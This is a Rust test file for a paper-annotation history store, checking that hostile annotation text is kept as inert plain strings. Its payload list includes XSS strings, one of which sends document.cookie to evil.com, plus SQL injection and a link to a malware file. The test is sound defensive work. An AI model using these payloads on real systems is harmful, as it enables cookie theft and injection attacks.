#![allow(clippy::unwrap_used, clippy::expect_used)]

use scribetrace_core::adapters::{parse_marks, FsHistoryStore, SystemClock, UuidGenerator};
use scribetrace_core::application::{Clock, HistoryStore, IdGenerator};
use scribetrace_core::domain::{DeviceId, Event, EventBody, PaperId, FORMAT_VERSION};

#[test]
fn test_hostile_annotation_text_stays_inert_in_storage() {
    let workspace = tempfile::tempdir().unwrap();
    let store = FsHistoryStore::new(workspace.path());
    let device = DeviceId::new("dev-secure").unwrap();
    let paper = PaperId::new("z_HOSTILE_PAPER").unwrap();

    let hostile_payloads = [
        "<script>alert('xss')</script>",
        r#"<img src="x" onerror="alert(document.cookie)">"#,
        "<svg onload=\"fetch('http://evil.com/'+document.cookie)\">",
        "javascript:alert(1)",
        "\x1b[31;1mANSI ESCAPE\x1b[0m",
        "\u{202E}gnitoops idib\u{202C}",
        "[Malicious link](https://evil.site/malware.exe)",
        "'; DROP TABLE events; --",
        r#"{"malicious":"json injection", "seq": 999999}"#,
    ];

    let mut items = Vec::new();
    for (i, payload) in hostile_payloads.iter().enumerate() {
        items.push(serde_json::json!({
            "data": {
                "key": format!("HKEY{i:04}"),
                "annotationType": "highlight",
                "annotationText": payload,
                "annotationComment": payload,
                "annotationColor": "#ffd400",
                "annotationPosition": "{\"pageIndex\":0,\"rects\":[[10,20,30,40]]}",
                "dateAdded": "2026-11-06T00:00:00Z",
                "dateModified": "2026-11-06T00:00:00Z"
            }
        }));
    }
    let mock_json = serde_json::to_string(&items).unwrap();

    // 1. Broker parser processes hostile text safely without panic or execution
    let marks = parse_marks(&mock_json).unwrap();
    assert_eq!(marks.len(), hostile_payloads.len());

    // 2. Append marks to history store
    let first = store.next_seq(&paper, &device).unwrap();
    for (seq, mark) in (first..).zip(marks) {
        let event = Event {
            v: FORMAT_VERSION,
            id: UuidGenerator.next_id(),
            device: device.clone(),
            seq,
            ts: SystemClock.now(),
            author: "Me".to_owned(),
            body: EventBody::MarkImport(mark),
        };
        store.append(&paper, &event).unwrap();
    }

    // 3. Read back from store: 0 skipped lines, 0 bad lines, all text preserved as inert plain strings
    let report = store.read_report(&paper).unwrap();
    assert_eq!(report.skipped_lines, 0);
    assert_eq!(report.visible_events.len(), hostile_payloads.len());

    for (i, ev) in report.visible_events.iter().enumerate() {
        match &ev.body {
            EventBody::MarkImport(m) => {
                let expected = hostile_payloads[i];
                assert_eq!(m.text.as_deref(), Some(expected));
                assert_eq!(m.comment.as_deref(), Some(expected));
            }
            _ => panic!("Expected MarkImport"),
        }
    }
}
